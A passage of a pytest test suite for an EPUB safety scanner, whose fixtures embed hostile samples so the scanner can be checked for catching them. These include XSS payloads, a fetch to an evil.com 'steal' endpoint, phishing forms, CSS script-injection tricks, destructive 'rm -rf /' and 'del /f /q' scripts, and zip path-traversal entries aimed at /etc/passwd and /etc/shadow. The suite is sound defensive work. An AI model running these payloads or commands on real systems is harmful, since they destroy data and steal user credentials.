#!/usr/bin/env python3
"""Unit tests for EPUB Safety Scanner."""

import os
import tempfile
import zipfile
from pathlib import Path

import pytest

from epub_safety_scanner import (
    EPUBFixer,
    EPUBScanner,
    Finding,
    ScanResult,
    Severity,
    format_findings,
    format_report_md,
    main,
)

# ── Helpers ──────────────────────────────────────────────────────────────────


def make_epub(files: dict[str, str | bytes], path: str | None = None) -> str:
    """Create a minimal EPUB file in a temp directory.

    Args:
        files: Dict of {filename: content} to include in the EPUB.
        path: Optional path for the EPUB file. If None, creates a temp file.

    Returns:
        Path to the created EPUB file.
    """
    if path is None:
        fd, path = tempfile.mkstemp(suffix=".epub")
        os.close(fd)

    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        # Always include minimal EPUB structure
        zf.writestr("mimetype", "application/epub+zip")
        zf.writestr(
            "META-INF/container.xml",
            '<?xml version="1.0"?>'
            '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
            "<rootfiles>"
            '<rootfile full-path="content.opf" media-type="application/oebps-package+xml"/>'
            "</rootfiles>"
            "</container>",
        )
        zf.writestr(
            "content.opf",
            '<?xml version="1.0"?>'
            '<package xmlns="http://www.idpf.org/2007/opf" version="3.0">'
            "<metadata/><manifest/><spine/>"
            "</package>",
        )
        for filename, content in files.items():
            if isinstance(content, str):
                zf.writestr(filename, content)
            else:
                zf.writestr(filename, content)

    return path


def scan_epub_with_files(files: dict[str, str | bytes]) -> ScanResult:
    """Create an EPUB with given files and scan it. Returns the ScanResult."""
    path = make_epub(files)
    try:
        scanner = EPUBScanner()
        results = scanner.scan(path)
        return results[0]
    finally:
        os.unlink(path)


def has_finding(
    result: ScanResult,
    severity: Severity | None = None,
    category: str | None = None,
    desc_contains: str | None = None,
) -> bool:
    """Check if the result contains a finding matching the criteria."""
    for f in result.findings:
        if severity and f.severity != severity:
            continue
        if category and f.category != category:
            continue
        if desc_contains and desc_contains.lower() not in f.description.lower():
            continue
        return True
    return False


# ── Clean EPUB Tests ─────────────────────────────────────────────────────────


class TestCleanEPUB:
    """Tests that clean EPUBs pass without findings."""

    def test_minimal_clean_epub(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<head><title>Test</title></head>"
                    "<body><p>Hello world</p></body>"
                    "</html>"
                ),
            }
        )
        assert result.is_clean, f"Expected clean but got: {[f.description for f in result.findings]}"

    def test_epub_with_css(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { font-family: serif; color: #333; }",
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<head><link rel='stylesheet' href='style.css'/></head>"
                    "<body><p>Styled content</p></body></html>"
                ),
            }
        )
        assert result.is_clean

    def test_epub_with_images(self):
        # Create a tiny valid PNG
        png_header = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
        result = scan_epub_with_files(
            {
                "images/cover.png": png_header,
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><img src='images/cover.png' alt='cover'/></body></html>"
                ),
            }
        )
        assert result.is_clean

    def test_prose_window_not_flagged(self):
        """English prose 'window.' at end of sentence should NOT trigger."""
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><p>She looked out the window. The sky was blue.</p></body></html>"
                ),
            }
        )
        assert result.is_clean, f"False positive: {[f.description for f in result.findings]}"

    def test_prose_document_not_flagged(self):
        """English prose 'document.' at end of sentence should NOT trigger."""
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><p>Please sign the document. It is important.</p></body></html>"
                ),
            }
        )
        assert result.is_clean, f"False positive: {[f.description for f in result.findings]}"

    def test_epub_with_internal_links(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    "<html xmlns=\"http://www.w3.org/1999/xhtml\"><body><a href='chapter2.xhtml'>Next</a></body></html>"
                ),
                "chapter2.xhtml": ('<html xmlns="http://www.w3.org/1999/xhtml"><body><p>Chapter 2</p></body></html>'),
            }
        )
        assert result.is_clean


# ── JavaScript Detection Tests ───────────────────────────────────────────────


class TestJavaScriptDetection:
    """Tests for detecting JavaScript in EPUBs."""

    def test_script_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    "<html xmlns=\"http://www.w3.org/1999/xhtml\"><body><script>alert('xss')</script></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "script tag")

    def test_script_tag_with_src(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><script src="evil.js"></script></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "script tag")

    def test_script_tag_case_insensitive(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><SCRIPT>alert(1)</SCRIPT></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "script tag")

    def test_javascript_uri(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><a href="javascript:alert(1)">click</a></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "javascript:")

    def test_inline_onclick(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><div onclick=\"alert('xss')\">click me</div></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "onclick")

    def test_inline_onerror(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><img src=x onerror="alert(1)"/></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "onerror")

    def test_inline_onload(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body onload="alert(1)"><p>test</p></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "onload")

    def test_eval_call(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><script>eval('malicious')</script></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "eval()")

    def test_js_file(self):
        result = scan_epub_with_files(
            {
                "scripts/app.js": "console.log('hello');",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "JavaScript file")

    def test_dom_manipulation(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>document.cookie</script></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "DOM manipulation")

    def test_fetch_api(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><script>fetch('https://evil.com/steal')</script></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "fetch()")

    def test_xmlhttprequest(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><script>new XMLHttpRequest()</script></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "XMLHttpRequest")

    def test_websocket(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><script>new WebSocket('ws://evil.com')</script></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "WebSocket")


# ── Malicious HTML Detection Tests ───────────────────────────────────────────


class TestMaliciousHTMLDetection:
    """Tests for detecting malicious HTML patterns."""

    def test_iframe(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><iframe src="https://evil.com"></iframe></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious HTML", "iframe")

    def test_object_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><object data="malware.swf" type="application/x-shockwave-flash">'
                    "</object></body></html>"
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious HTML", "object")

    def test_embed_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><embed src="plugin.swf"/></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious HTML", "embed")

    def test_form_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><form action="https://evil.com/phish">'
                    '<input type="text" name="password"/></form></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious HTML", "form")

    def test_applet_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml"><body><applet code="Evil.class"></applet></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious HTML", "applet")

    def test_meta_refresh(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<head><meta http-equiv="refresh" content="0;url=https://evil.com"/>'
                    "</head><body/></html>"
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious HTML", "meta refresh")

    def test_base_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<head><base href="https://evil.com/"/></head>'
                    "<body/></html>"
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious HTML", "base tag")

    def test_data_uri_html(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><a href="data:text/html,<script>alert(1)</script>">x</a></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious HTML", "data: URI")


# ── Malicious CSS Detection Tests ────────────────────────────────────────────


class TestMaliciousCSSDetection:
    """Tests for detecting malicious CSS patterns."""

    def test_css_expression(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { width: expression(alert(1)); }",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "expression()")

    def test_moz_binding(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { -moz-binding: url('evil.xml#xss'); }",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "-moz-binding")

    def test_css_behavior(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { behavior: url(evil.htc); }",
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious CSS", "behavior")

    def test_external_import(self):
        result = scan_epub_with_files(
            {
                "style.css": "@import url('https://evil.com/track.css');",
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious CSS", "external @import")

    def test_external_url_in_css(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { background: url('https://evil.com/pixel.gif'); }",
            }
        )
        assert has_finding(result, Severity.WARNING, "Malicious CSS", "external url()")

    def test_javascript_in_css_url(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { background: url('javascript:alert(1)'); }",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "javascript:")

    def test_css_in_style_tag(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<head><style>body { width: expression(alert(1)); }</style></head>"
                    "<body/></html>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "expression()")

    def test_css_in_style_attribute(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><div style="width: expression(alert(1))">x</div></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "expression()")

    def test_data_html_in_css_url(self):
        result = scan_epub_with_files(
            {
                "style.css": "body { background: url('data:text/html,<script>alert(1)</script>'); }",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Malicious CSS", "data:text/html")


# ── Suspicious File Detection Tests ──────────────────────────────────────────


class TestSuspiciousFiles:
    """Tests for detecting suspicious files in EPUBs."""

    def test_exe_file(self):
        result = scan_epub_with_files(
            {
                "payload.exe": b"MZ" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".exe")

    def test_bat_file(self):
        result = scan_epub_with_files(
            {
                "run.bat": b"@echo off\r\ndel /f /q *.*",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".bat")

    def test_ps1_file(self):
        result = scan_epub_with_files(
            {
                "script.ps1": b"Invoke-WebRequest https://evil.com",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".ps1")

    def test_sh_file(self):
        result = scan_epub_with_files(
            {
                "run.sh": b"#!/bin/bash\nrm -rf /",
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".sh")

    def test_dll_file(self):
        result = scan_epub_with_files(
            {
                "evil.dll": b"MZ" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".dll")

    def test_nested_zip(self):
        result = scan_epub_with_files(
            {
                "payload.zip": b"PK\x03\x04" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.WARNING, "Nested Archive", ".zip")

    def test_nested_rar(self):
        result = scan_epub_with_files(
            {
                "payload.rar": b"Rar!\x1a\x07" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.WARNING, "Nested Archive", ".rar")

    def test_disguised_executable(self):
        """An EXE disguised as a PNG."""
        result = scan_epub_with_files(
            {
                "images/cover.png": b"MZ" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Disguised Executable")

    def test_jar_file(self):
        result = scan_epub_with_files(
            {
                "evil.jar": b"PK\x03\x04" + b"\x00" * 100,
            }
        )
        assert has_finding(result, Severity.CRITICAL, "Dangerous File", ".jar")


# ── Path Traversal Tests ────────────────────────────────────────────────────


class TestPathTraversal:
    """Tests for detecting path traversal in ZIP entries."""

    def test_path_traversal_dotdot(self):
        """Manually craft a ZIP with ../ in the filename."""
        fd, path = tempfile.mkstemp(suffix=".epub")
        os.close(fd)
        try:
            with zipfile.ZipFile(path, "w") as zf:
                zf.writestr("mimetype", "application/epub+zip")
                zf.writestr("../../etc/passwd", "root:x:0:0:")
            scanner = EPUBScanner()
            results = scanner.scan(path)
            assert has_finding(results[0], Severity.CRITICAL, "Path Traversal")
        finally:
            os.unlink(path)

    def test_path_traversal_absolute(self):
        """ZIP entry with absolute path."""
        fd, path = tempfile.mkstemp(suffix=".epub")
        os.close(fd)
        try:
            with zipfile.ZipFile(path, "w") as zf:
                zf.writestr("mimetype", "application/epub+zip")
                zf.writestr("/etc/shadow", "root::0:0:")
            scanner = EPUBScanner()
            results = scanner.scan(path)
            assert has_finding(results[0], Severity.CRITICAL, "Path Traversal")
        finally:
            os.unlink(path)


# ── Zip Bomb Detection Tests ────────────────────────────────────────────────


class TestZipBomb:
    """Tests for detecting zip bombs."""

    def test_high_compression_ratio(self):
        """Create a file with very high compression ratio (lots of repeated bytes)."""
        fd, path = tempfile.mkstemp(suffix=".epub")
        os.close(fd)
        try:
            with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("mimetype", "application/epub+zip")
                # Repeated null bytes compress extremely well (ratio >> 100:1)
                bomb_data = b"\x00" * (1024 * 1024)  # 1MB of zeros
                zf.writestr("bomb.bin", bomb_data)

            scanner = EPUBScanner()
            results = scanner.scan(path)
            assert has_finding(results[0], Severity.WARNING, "Zip Bomb", "compression ratio")
        finally:
            os.unlink(path)


# ── External Resource Tests ──────────────────────────────────────────────────


class TestExternalResources:
    """Tests for detecting external resource loading."""

    def test_external_image_src(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><img src="https://evil.com/track.gif"/></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "External Resource")

    def test_external_link_href(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><a href="https://example.com">link</a></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.INFO, "External Link")

    def test_external_form_action(self):
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><form action="https://evil.com/steal">'
                    '<input type="text"/></form></body></html>'
                ),
            }
        )
        assert has_finding(result, Severity.WARNING, "External Resource")


# ── SVG Scan Tests ───────────────────────────────────────────────────────────


class TestSVGScan:
    """Tests for scanning SVG files for malicious content."""

    def test_svg_with_script(self):
        result = scan_epub_with_files(
            {
                "image.svg": (
                    '<?xml version="1.0"?>'
                    '<svg xmlns="http://www.w3.org/2000/svg">'
                    "<script>alert('xss')</script>"
                    '<circle cx="50" cy="50" r="40"/>'
                    "</svg>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "script tag")

    def test_svg_with_onload(self):
        result = scan_epub_with_files(
            {
                "image.svg": (
                    '<?xml version="1.0"?>'
                    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
                    '<circle cx="50" cy="50" r="40"/>'
                    "</svg>"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "onload")


# ── Error Handling Tests ─────────────────────────────────────────────────────


class TestErrorHandling:
    """Tests for error handling."""

    def test_nonexistent_file(self):
        scanner = EPUBScanner()
        results = scanner.scan("/nonexistent/file.epub")
        assert len(results) == 1
        assert results[0].error

    def test_invalid_zip(self):
        fd, path = tempfile.mkstemp(suffix=".epub")
        os.close(fd)
        try:
            with open(path, "wb") as f:
                f.write(b"this is not a zip file at all")
            scanner = EPUBScanner()
            results = scanner.scan(path)
            assert results[0].error
            assert "Invalid ZIP" in results[0].error or "Error" in results[0].error
        finally:
            os.unlink(path)

    def test_no_matching_files(self):
        scanner = EPUBScanner()
        results = scanner.scan("/nonexistent_path/pattern_*.epub")
        assert len(results) == 1
        assert results[0].error


# ── Glob Pattern Tests ───────────────────────────────────────────────────────


class TestGlobPattern:
    """Tests for glob pattern scanning."""

    def test_scan_multiple_files(self):
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>clean</p></body></html>'},
                os.path.join(tmpdir, "book1.epub"),
            )
            make_epub(
                {
                    "ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>alert(1)</script></body></html>'
                },
                os.path.join(tmpdir, "book2.epub"),
            )

            scanner = EPUBScanner()
            results = scanner.scan(os.path.join(tmpdir, "*.epub"))
            assert len(results) == 2

            # One should be clean-ish, the other should have findings
            has_js_finding = any(has_finding(r, Severity.CRITICAL, "JavaScript") for r in results)
            assert has_js_finding
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_scan_directory_auto_glob(self):
        """Passing a directory path should auto-scan *.epub inside it."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "a.epub"),
            )
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "b.epub"),
            )
            # non-epub file should be ignored
            with open(os.path.join(tmpdir, "readme.txt"), "w") as f:
                f.write("not an epub")

            scanner = EPUBScanner()
            results = scanner.scan(tmpdir)
            assert len(results) == 2
            assert all(r.is_clean for r in results)
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_scan_directory_trailing_slash(self):
        """Directory with trailing slash should also work."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "book.epub"),
            )

            scanner = EPUBScanner()
            results = scanner.scan(tmpdir + "/")
            assert len(results) == 1
            assert results[0].is_clean
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_scan_empty_directory(self):
        """Directory with no epub files should return an error result."""
        tmpdir = tempfile.mkdtemp()
        try:
            scanner = EPUBScanner()
            results = scanner.scan(tmpdir)
            assert len(results) == 1
            assert results[0].error
        finally:
            os.rmdir(tmpdir)

    def test_scan_tilde_expansion(self, monkeypatch):
        """~ in path should be expanded to the user's home directory."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "test.epub"),
            )
            # Make expanduser map ~ to our tmpdir's parent
            parent = os.path.dirname(tmpdir)
            dirname = os.path.basename(tmpdir)
            monkeypatch.setattr(os.path, "expanduser", lambda p: p.replace("~", parent, 1))

            scanner = EPUBScanner()
            results = scanner.scan(f"~/{dirname}/test.epub")
            assert len(results) == 1
            assert not results[0].error
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_scan_tilde_with_glob(self, monkeypatch):
        """~/dir/*.epub should expand ~ and glob for epubs."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "a.epub"),
            )
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "b.epub"),
            )

            parent = os.path.dirname(tmpdir)
            dirname = os.path.basename(tmpdir)
            monkeypatch.setattr(os.path, "expanduser", lambda p: p.replace("~", parent, 1))

            scanner = EPUBScanner()
            results = scanner.scan(f"~/{dirname}/*.epub")
            assert len(results) == 2
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_scan_tilde_directory(self, monkeypatch):
        """~/dir/ should expand ~ and auto-glob *.epub."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "book.epub"),
            )

            parent = os.path.dirname(tmpdir)
            dirname = os.path.basename(tmpdir)
            monkeypatch.setattr(os.path, "expanduser", lambda p: p.replace("~", parent, 1))

            scanner = EPUBScanner()
            results = scanner.scan(f"~/{dirname}/")
            assert len(results) == 1
            assert results[0].is_clean
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)


# ── Output Formatting Tests ──────────────────────────────────────────────────


class TestFormatting:
    """Tests for output formatting."""

    def test_clean_output(self):
        result = ScanResult(epub_path="test.epub")
        output = format_findings(result, use_color=False)
        assert "CLEAN" in output
        assert "test.epub" in output

    def test_error_output(self):
        result = ScanResult(epub_path="bad.epub", error="File not found")
        output = format_findings(result, use_color=False)
        assert "ERROR" in output
        assert "File not found" in output

    def test_finding_output(self):
        result = ScanResult(
            epub_path="evil.epub",
            findings=[
                Finding(
                    severity=Severity.CRITICAL,
                    category="JavaScript",
                    file_path="ch1.xhtml",
                    description="script tag detected",
                    evidence="<script>alert(1)</script>",
                ),
            ],
        )
        output = format_findings(result, use_color=False)
        assert "CRITICAL" in output
        assert "JavaScript" in output
        assert "script tag" in output
        assert "ch1.xhtml" in output

    def test_summary_counts(self):
        result = ScanResult(
            epub_path="test.epub",
            findings=[
                Finding(Severity.CRITICAL, "JS", "f.xhtml", "test1"),
                Finding(Severity.WARNING, "CSS", "f.css", "test2"),
                Finding(Severity.INFO, "Link", "f.xhtml", "test3"),
            ],
        )
        assert result.critical_count == 1
        assert result.warning_count == 1
        assert result.info_count == 1

    def test_info_hidden_by_default(self):
        result = ScanResult(
            epub_path="test.epub",
            findings=[
                Finding(Severity.CRITICAL, "JS", "f.xhtml", "script tag"),
                Finding(Severity.INFO, "External Link", "f.xhtml", "External link: https://example.com"),
            ],
        )
        output = format_findings(result, use_color=False)
        assert "script tag" in output
        assert "External link" not in output

    def test_info_only_shows_clean(self):
        """Files with only INFO findings should display as CLEAN by default."""
        result = ScanResult(
            epub_path="test.epub",
            findings=[
                Finding(Severity.INFO, "External Link", "f.xhtml", "External link: https://example.com"),
            ],
        )
        output = format_findings(result, use_color=False)
        assert "CLEAN" in output
        assert "External link" not in output

    def test_info_only_shows_findings_with_verbose(self):
        """Files with only INFO findings should show details with --verbose."""
        result = ScanResult(
            epub_path="test.epub",
            findings=[
                Finding(Severity.INFO, "External Link", "f.xhtml", "External link: https://example.com"),
            ],
        )
        output = format_findings(result, use_color=False, verbose=True)
        assert "CLEAN" not in output
        assert "External link" in output
        assert "INFO:" in output

    def test_info_shown_with_verbose(self):
        result = ScanResult(
            epub_path="test.epub",
            findings=[
                Finding(Severity.CRITICAL, "JS", "f.xhtml", "script tag"),
                Finding(Severity.INFO, "External Link", "f.xhtml", "External link: https://example.com"),
            ],
        )
        output = format_findings(result, use_color=False, verbose=True)
        assert "script tag" in output
        assert "External link" in output
        assert "INFO:" in output


# ── Multi-file Summary Tests ─────────────────────────────────────────────────


class TestMultiFileSummary:
    """Tests for the detailed multi-file summary output."""

    def test_summary_lists_each_file(self, capsys, monkeypatch):
        """Multi-file summary should list each file with its status."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>clean</p></body></html>'},
                os.path.join(tmpdir, "clean.epub"),
            )
            make_epub(
                {
                    "ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>alert(1)</script></body></html>'
                },
                os.path.join(tmpdir, "evil.epub"),
            )

            monkeypatch.setattr("sys.argv", ["scanner", "--path", tmpdir, "--no-color"])
            main()
            output = capsys.readouterr().out

            # Summary block should exist
            assert "TOTAL: Scanned 2 files" in output
            # Clean file should be labelled CLEAN
            assert "CLEAN" in output
            assert "clean.epub" in output
            # Evil file should show critical count and finding details
            assert "evil.epub" in output
            assert "critical" in output
            assert "script tag detected" in output
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_summary_shows_finding_file_paths(self, capsys, monkeypatch):
        """Summary should show internal file path and description for each finding."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {
                    "ch1.xhtml": (
                        '<html xmlns="http://www.w3.org/1999/xhtml"><body><iframe src="x"></iframe></body></html>'
                    ),
                    "evil.js": "alert(1);",
                },
                os.path.join(tmpdir, "multi.epub"),
            )
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "ok.epub"),
            )

            monkeypatch.setattr("sys.argv", ["scanner", "--path", tmpdir, "--no-color"])
            main()
            output = capsys.readouterr().out

            # Should list internal file paths with descriptions in summary
            assert "ch1.xhtml" in output
            assert "iframe" in output.lower()
            assert "evil.js" in output
            assert "JavaScript file" in output
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_summary_shows_error_files(self, capsys, monkeypatch):
        """Files that error should show ERROR status in summary."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "good.epub"),
            )
            # Write a corrupt epub
            with open(os.path.join(tmpdir, "corrupt.epub"), "wb") as f:
                f.write(b"this is not a zip file")

            monkeypatch.setattr("sys.argv", ["scanner", "--path", tmpdir, "--no-color"])
            main()
            output = capsys.readouterr().out

            assert "TOTAL: Scanned 2 files" in output
            assert "ERROR" in output
            assert "corrupt.epub" in output
            assert "CLEAN" in output
            assert "good.epub" in output
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_no_summary_for_single_file(self, capsys, monkeypatch):
        """Single file scan should NOT show the TOTAL summary block."""
        tmpdir = tempfile.mkdtemp()
        try:
            epub_path = make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "single.epub"),
            )

            monkeypatch.setattr("sys.argv", ["scanner", "--path", epub_path, "--no-color"])
            main()
            output = capsys.readouterr().out

            assert "TOTAL:" not in output
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)


# ── Markdown Report Tests ────────────────────────────────────────────────────


class TestMarkdownReport:
    """Tests for Markdown report generation."""

    def test_report_contains_header_and_date(self):
        results = [ScanResult(epub_path="test.epub")]
        md = format_report_md(results)
        assert "# EPUB Safety Scanner Report" in md
        assert "**Date**" in md
        assert "**Files scanned**: 1" in md

    def test_report_clean_file(self):
